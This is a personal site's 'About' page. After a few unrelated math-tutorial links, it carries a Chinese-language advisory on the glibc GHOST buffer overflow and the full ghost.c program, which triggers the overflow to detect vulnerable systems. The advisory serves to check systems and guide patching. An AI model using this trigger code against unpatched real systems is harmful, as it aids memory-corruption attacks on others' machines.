---
layout: page
title: About
permalink: /about/
---

https://www.shuxuele.com/decimals-menu.html

https://hairuo.blogspot.com

https://www.youtube.com/watch?v=qWeE2tnveaU

https://www.shuxuele.com/place-value.html

https://www.shuxuele.com/decimals.html




glibc `__nss_hostname_digits_dots()` 存在一个缓冲区溢出的漏洞，可以经过 `gethostbyname*()` 被本地或者远程触发，攻击者可以利用该漏洞执行指令，控制存在漏洞的系统。

发现者以“幽灵”(GHOST)命名此漏洞。

1. 漏洞影响范围
此漏洞影响使用GNU libc 2.2-2.17的Linux系统.

2. 漏洞验证方法
ghost.c

执行漏洞测试程序，如果程序输出vulnerable则说明存在漏洞。 

3. 漏洞修复方法
将libc 升级到最新版本，另外在升级完libc后需要重启系统。

```c  
// ghost.c
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#define CANARY "in_the_coal_mine"

struct {
  char buffer[1024];
  char canary[sizeof(CANARY)];
} temp = { "buffer", CANARY };

int main(void) {
  struct hostent resbuf;
  struct hostent *result;
  int herrno;
  int retval;

  /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/

  size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;

  char name[sizeof(temp.buffer)];
  memset(name, '0', len);
  name[len] = '\0';

  retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);

  if (strcmp(temp.canary, CANARY) != 0) {
    puts("vulnerable");
    exit(EXIT_SUCCESS);
  }

  if (retval == ERANGE) {
    puts("not vulnerable");
    exit(EXIT_SUCCESS);
  }

  puts("should not happen");
  exit(EXIT_FAILURE);
}
```
